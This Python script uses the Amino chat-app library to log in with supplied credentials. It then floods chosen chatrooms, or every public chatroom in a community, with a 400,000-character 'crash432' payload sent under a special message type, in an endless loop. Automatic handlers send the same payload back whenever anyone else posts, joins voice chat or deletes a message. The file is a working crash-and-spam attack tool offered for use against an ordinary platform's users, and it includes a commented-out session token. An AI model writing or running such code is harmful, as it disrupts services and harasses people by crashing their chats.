# -*-coding: utf-8 -*
import amino
from time import sleep
import time
import sys
from os import system
# from os import path
# THIS_FOLDER = path.dirname(path.abspath(__file__))
# ant=path.join(THIS_FOLDER, 'antipro.py')





def clear(): 
    _ = system('clear')

client = amino.Client()
chatroom = '0'
email=sys.argv[1]
password=sys.argv[2]
types=109

comid='0'
chatmenu=[]
chatname={}
commenu={}
# Mes="crash"*50000

client.login(email,password)
# client.login_sid("AnsiMSI6IG51bGwsICIwIjogMiwgIjMiOiAwLCAiMiI6ICJjMGFiMWYwNi05ODU0LTQ2ZjItODA5Mi1lZGYxMDlhMmIzZmIiLCAiNSI6IDE2MTI4NDUwODYsICI0IjogIjQ3LjkuMTkzLjEyMiIsICI2IjogMTAwfSqZIyqo32x3-Tp8I3WHxNFrSJSR")
print('\nLogged in \n')



print('\nAvailable Communities')
comlist= client.sub_clients(size=100)
print('\n')
y=0
for name, id in zip(comlist.name,comlist.comId):
    print(y+1 ," : ",name)
    commenu[y]=str(id)
    y+=1
print("press 0 to join via link")
menu=input(">> ")
if int(menu) == 0:
    link = amino.Client().get_from_code(str(input("Link community: ")))
    ndcId  = link.json["extensions"]["community"]["ndcId"]
    print(f'\nndcId: {ndcId}')
    comid=ndcId
    client.join_community(comId=comid)
else:
    comid=commenu[int(menu)-1]

subclient = amino.SubClient(comId=comid, profile=client.profile)


@client.callbacks.event("on_text_message")
def on_text_message(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

@client.callbacks.event("on_sticker_message")
def on_sticker_message(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

@client.callbacks.event("on_voice_chat_start")
def on_voice_chat_start(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

@client.callbacks.event("on_voice_chat_end")
def on_voice_chat_end(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

@client.callbacks.event("on_screen_room_start")
def on_screen_room_start(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

@client.callbacks.event("on_screen_room_end")
def on_screen_room_end(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

@client.callbacks.event("on_delete_messag")
def on_delete_message(data):
    if str(data.comId)==comid and data.message.author.userId != subclient.profile.userId:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=types)
        # subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=types)
        print(f"{data.message.author.nickname} tried to stop almighty Meta Proxy but the attempt has been nullified")

# system(f"python3 {ant} {email} {password} {comid}")
clear()
print("\n")

        




decoy=input('Enter decoy message >> ')
while True:

    
    print('\nenter 1 if you want to let loose on the whole community')
    print('\nenter 2 if you want to target via Link of the chatroom')
    print()
    menu = int(input("\n >> "))
    

    if menu == 2:
        m=True
        
        clear()
        link=input("http://aminoapps.com/p/")
        cobj=client.get_from_code(link).objectId
        subclient.join_chat(cobj)
        message="crash432"*50000
        # po=1
        # po=99
        while True:
            subclient.send_message(chatId=cobj,message=message,messageType=types)
            subclient.send_message(chatId=cobj,message=decoy,messageType=types)
            # tit=subclient.get_chat_thread(cobj).title
            print('\nchat Totalled')
            # subclient.leave_chat(cobj)

    
    if menu == 1:
        clear()
        clear()
        print('\nAvailable Chatrooms')
        x=0
        chats = subclient.get_public_chat_threads(size=100)
        for name, id in zip (chats.title, chats.chatId):
            if name!=None:
                print(x+1," : ", name)  
                chatname[x]=str(name)
                chatmenu.append(str(id))
                x+=1

        x=0
        while True:
            for i in chatmenu:
                subclient.join_chat(i)
                message="crash432"*50000
                subclient.send_message(chatId=i,message=message,messageType=types)
                subclient.send_message(chatId=i,message=decoy,messageType=types)
                print('\nchat Totalled', chatname[x])
                # subclient.leave_chat(i)
                x+=1





